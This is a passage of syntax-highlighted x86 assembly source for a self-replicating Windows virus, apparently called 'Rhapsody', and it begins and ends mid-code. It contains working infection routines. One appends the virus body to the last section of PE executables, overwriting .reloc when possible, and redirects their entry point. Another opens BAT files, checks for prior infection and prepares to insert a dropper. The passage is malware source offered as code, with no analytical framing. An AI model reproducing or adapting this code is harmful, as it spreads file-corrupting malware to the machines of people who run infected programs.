    </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">06h</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">imul</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">28h</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">78h</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">74h</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">03h</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">                         </span><span class="sc1">; ESI = Last section header</span><span class="sc0">
                                                </span><span class="sc1">; EDI = PE header</span><span class="sc0">

        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">24h</span><span class="sc4">],</span><span class="sc2">0A0000020h</span><span class="sc0">            </span><span class="sc1">; New section attributes</span><span class="sc0">

        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">0A0h</span><span class="sc4">],</span><span class="sc2">00h</span><span class="sc0">        </span><span class="sc1">; Nulify fixups</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">0A4h</span><span class="sc4">],</span><span class="sc2">00h</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc3">"ler."</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">RelocNotLast</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc3">"co"</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">RelocNotLast</span><span class="sc0">

</span><span class="sc1">; Overwriting stage, .reloc is last section</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc0">             </span><span class="sc1">; Set new section name to</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0">           </span><span class="sc1">; 'Rhapsody' also ;)</span><span class="sc0">

        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">18h</span><span class="sc4">],</span><span class="sc2">00h</span><span class="sc0">         </span><span class="sc1">; Clear PointerToRelocations</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">20h</span><span class="sc4">],</span><span class="sc2">00h</span><span class="sc0">          </span><span class="sc1">; Clear NumberOfRelocations</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">14h</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">; Where copy virus</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">virus_size</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">08h</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">                   </span><span class="sc1">; VirtualSize -&gt; virus size</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">3Ch</span><span class="sc4">]</span><span class="sc0">                   </span><span class="sc1">; ECX = Alignment</span><span class="sc0">

        </span><span class="sc6">cdq</span><span class="sc0">                                     </span><span class="sc1">; Align, sucker</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">div</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">                   </span><span class="sc1">; SizeOfRawData -&gt; aligned</span><span class="sc0">
                                                </span><span class="sc1">;                  virus size</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">]</span><span class="sc0">                   </span><span class="sc1">; Fix ImageSize to allow it</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">0Ch</span><span class="sc4">]</span><span class="sc0">                   </span><span class="sc1">; to work in NT :P</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">50h</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
        
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">0Ch</span><span class="sc4">]</span><span class="sc0">                   </span><span class="sc1">; New EIP</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">28h</span><span class="sc4">]</span><span class="sc0">                   </span><span class="sc1">; Put new EIP and get old one</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">OldEIP</span><span class="sc0"> </span><span class="sc5">d</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                    </span><span class="sc1">; Save it</span><span class="sc0">

        </span><span class="sc6">pushad</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">14h</span><span class="sc4">]</span><span class="sc0">                   </span><span class="sc1">; EDX = Where truncate</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">3Ch</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc6">cdq</span><span class="sc0">                                     </span><span class="sc1">; Align, sucker</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">div</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">esp.PUSHAD_EDX</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">popad</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+(</span><span class="sc5">MapAddress</span><span class="sc4">-</span><span class="sc5">delta</span><span class="sc4">)]</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc5">virus_start</span><span class="sc0"> </span><span class="sc5">d</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">virus_size</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsb</span><span class="sc0">

        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">Trunc</span><span class="sc4">&amp;</span><span class="sc5">UnMap</span><span class="sc4">&amp;</span><span class="sc5">CloseMap</span><span class="sc4">&amp;</span><span class="sc5">FileExitInfectPE</span><span class="sc0">

</span><span class="sc1">; Normal stage, .reloc not last or not present</span><span class="sc0">

</span><span class="sc5">RelocNotLast</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">14h</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">0Ch</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">28h</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">                   </span><span class="sc1">; Put new EIP</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">OldEIP</span><span class="sc0"> </span><span class="sc5">d</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">virus_size</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">3Ch</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc6">cdq</span><span class="sc0">                                     </span><span class="sc1">; Align, sucker</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">div</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">08h</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">0Ch</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">50h</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">14h</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc5">virus_start</span><span class="sc0"> </span><span class="sc5">d</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+(</span><span class="sc5">MapAddress</span><span class="sc4">-</span><span class="sc5">delta</span><span class="sc4">)]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">virus_size</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsb</span><span class="sc0">

</span><span class="sc5">Trunc</span><span class="sc4">&amp;</span><span class="sc5">UnMap</span><span class="sc4">&amp;</span><span class="sc5">CloseMap</span><span class="sc4">&amp;</span><span class="sc5">FileExitInfectPE</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+(</span><span class="sc5">FileHandle</span><span class="sc4">-</span><span class="sc5">delta</span><span class="sc4">)]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">SetFilePointer</span><span class="sc0"> </span><span class="sc5">d</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+(</span><span class="sc5">FileHandle</span><span class="sc4">-</span><span class="sc5">delta</span><span class="sc4">)]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">SetEndOfFile</span><span class="sc0"> </span><span class="sc5">d</span><span class="sc0">

</span><span class="sc5">UnMap</span><span class="sc4">&amp;</span><span class="sc5">CloseMap</span><span class="sc4">&amp;</span><span class="sc5">FileExitInfectPE</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+(</span><span class="sc5">MapAddress</span><span class="sc4">-</span><span class="sc5">delta</span><span class="sc4">)]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">UnmapViewOfFile</span><span class="sc0"> </span><span class="sc5">d</span><span class="sc0">

</span><span class="sc5">CloseMap</span><span class="sc4">&amp;</span><span class="sc5">FileExitInfectPE</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+(</span><span class="sc5">MapHandle</span><span class="sc4">-</span><span class="sc5">delta</span><span class="sc4">)]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">CloseHandle</span><span class="sc0"> </span><span class="sc5">d</span><span class="sc0">

</span><span class="sc5">CloseFileExitInfectPE</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+(</span><span class="sc5">FileHandle</span><span class="sc4">-</span><span class="sc5">delta</span><span class="sc4">)]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">CloseHandle</span><span class="sc0"> </span><span class="sc5">d</span><span class="sc0">

</span><span class="sc5">ExitInfectPE</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">; [ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ]</span><span class="sc0">
</span><span class="sc1">; [ Infect BAT files                                                        ]</span><span class="sc0">
</span><span class="sc1">; [ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ]</span><span class="sc0">

</span><span class="sc5">InfectBAT</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc1">; BAT Infection, part 1</span><span class="sc0">

        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                         </span><span class="sc1">; Open BAT file for R/W</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">03h</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0C0000000h</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">CreateFileA</span><span class="sc0"> </span><span class="sc5">d</span><span class="sc0">

        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">ExitInfectBAT</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">FileHandle2</span><span class="sc0"> </span><span class="sc5">d</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">00h</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetFileSize</span><span class="sc0"> </span><span class="sc5">d</span><span class="sc0">                   </span><span class="sc1">; Get its size</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">Size2I</span><span class="sc0"> </span><span class="sc5">d</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">pushad</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">00h</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GlobalAlloc</span><span class="sc0"> </span><span class="sc5">d</span><span class="sc0">                   </span><span class="sc1">; Get a place where store it</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">GlobalAllocHandle</span><span class="sc0"> </span><span class="sc5">d</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">00h</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">NumOfBytesWritten</span><span class="sc0"> </span><span class="sc5">d</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+(</span><span class="sc5">Size2I</span><span class="sc4">-</span><span class="sc5">delta</span><span class="sc4">)]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+(</span><span class="sc5">FileHandle2</span><span class="sc4">-</span><span class="sc5">delta</span><span class="sc4">)]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ReadFile</span><span class="sc0"> </span><span class="sc5">d</span><span class="sc0">                      </span><span class="sc1">; Save actual BAT contents</span><span class="sc0">
        </span><span class="sc6">popad</span><span class="sc0">

        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">2000h</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">                         </span><span class="sc1">; EBX = 0</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                             </span><span class="sc1">; push size</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">04h</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">                             </span><span class="sc1">; push handle</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">CreateFileMappingA</span><span class="sc0"> </span><span class="sc5">d</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">                             </span><span class="sc1">; ECX = Size to map</span><span class="sc0">

        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">CloseAndExitInfectBAT</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">MapHandle2</span><span class="sc0"> </span><span class="sc5">d</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">02h</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">MapViewOfFile</span><span class="sc0"> </span><span class="sc5">d</span><span class="sc0">

        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">UnMap</span><span class="sc4">&amp;</span><span class="sc5">CloseMap</span><span class="sc4">&amp;</span><span class="sc5">FileExitInfectBAT</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">MapAddress2</span><span class="sc0"> </span><span class="sc5">d</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc3">"D:"</span><span class="sc0">             </span><span class="sc1">; Don't reinfect BAT</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">UnMap</span><span class="sc4">&amp;</span><span class="sc5">CloseMap</span><span class="sc4">&amp;</span><span class="sc5">FileExitInfectBAT</span><span class="sc0">

</span><span class="sc1">; BAT Infection, part 2</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">4096d</span><span class="sc0">                           </span><span class="sc1">; Alloc some memory more</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">00h</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GlobalAlloc</span><span class="sc0"> </span><span class="sc5">d</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">GlobalAllocHandle3</span><span class="sc0"> </span><span class="sc5">d</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">over_dr0p</span><span class="sc0">
